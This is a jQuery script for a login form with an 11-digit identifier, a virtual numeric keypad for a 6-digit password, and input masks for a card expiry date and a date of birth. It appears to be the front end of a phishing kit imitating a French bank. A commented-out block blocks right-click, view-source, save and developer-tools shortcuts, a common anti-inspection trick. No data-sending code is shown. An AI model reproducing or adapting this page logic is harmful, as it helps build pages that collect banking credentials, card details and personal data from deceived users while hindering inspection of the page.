var isShift = false;
var seperator = "/";
var dash = '-';

function cc_date(input, keyCode) {
    if (keyCode == 16) {
        isShift = true;
    }
    //Allow only Numeric Keys.
    if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
        if( keyCode == 8 ) {
            input.value = '';
        } else if (input.value.length == 2) {
            input.value += seperator;
        }
        return true;
    }
    else {
        return false;
    }
};

function date_of_birth(input, keyCode) {
    if (keyCode == 16) {
        isShift = true;
    }
    //Allow only Numeric Keys.
    if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
        if( keyCode == 8 ) {
            input.value = '';
        } else if (input.value.length == 2 || input.value.length == 5) {
            input.value += seperator;
        }
        return true;
    }
    else {
        return false;
    }
};

jQuery(function($){

    /*document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });*/
    
    $('.form .numbers ul li a').click(function(){
        var num     = $(this).data('number');
        var old_val = $('#password').val();
        var zz = old_val + num;
        if( $('#password').val().length == 6 )
            return false;
        $('#password').val(zz);
        if( $('#password').val().length > 0 ) {
            $('#password').siblings('.btn-x').show();
        } else {
            $('#password').siblings('.btn-x').hide();
        }
        if( $('#password').val().length > 5 ) {
            $('.btn-submit').removeClass('disabled');
            $('.btn-submit').removeAttr('disabled');
        } else {
            if( $('#password').hasClass('disabled') == false ) {
                $('.btn-submit').addClass('disabled');
                $('.btn-submit').attr('disabled','disabled');
            }
        }
    });

    $('#identifiant').keyup(function(){
        if( $(this).val().length > 0 ) {
            $(this).siblings('.btn-x').show();
        } else {
            $(this).siblings('.btn-x').hide();
        }

        if( $(this).val().length == 11 ) {
            $('.btn-get-pass').removeClass('disabled');
        } else {
            if( $('.btn-get-pass').hasClass('disabled') == false ) {
                $('.btn-get-pass').addClass('disabled');
            }
        }
    });

    $('.btn-identifiant').click(function(){
        $('#identifiant').val('');
        $('#password').val('');
        $('.zow').hide();
        $('.btn-password').hide();
        $('.btn-get-pass').addClass('disabled');
        $('#identifiant').removeAttr('readonly');
        $('.btn-get-pass').show();
        $('.btn-submit').addClass('disabled');
        $('.btn-submit').attr('disabled','disabled');
        $(this).hide();
    });

    $('.btn-password').click(function(){
        $('#password').val('');
        $('.btn-submit').addClass('disabled');
        $('.btn-submit').attr('disabled','disabled');
        $(this).hide();
    });

    $('.btn-get-pass').click(function(){
        if( $('.btn-get-pass').hasClass('disabled') == false ) {
            $('.zow').show();
            $('#identifiant').attr('readonly','readonly');
            $(this).hide();
        }
    });

    /*var input_cc_date = $("#cc_date");
    input_cc_date.keydown(function(e){
        cc_date(this, e.keyCode);
    });*/

    var input_birth_date = $("#birth_date");
    input_birth_date.keydown(function(e){
        date_of_birth(this, e.keyCode);
    });

})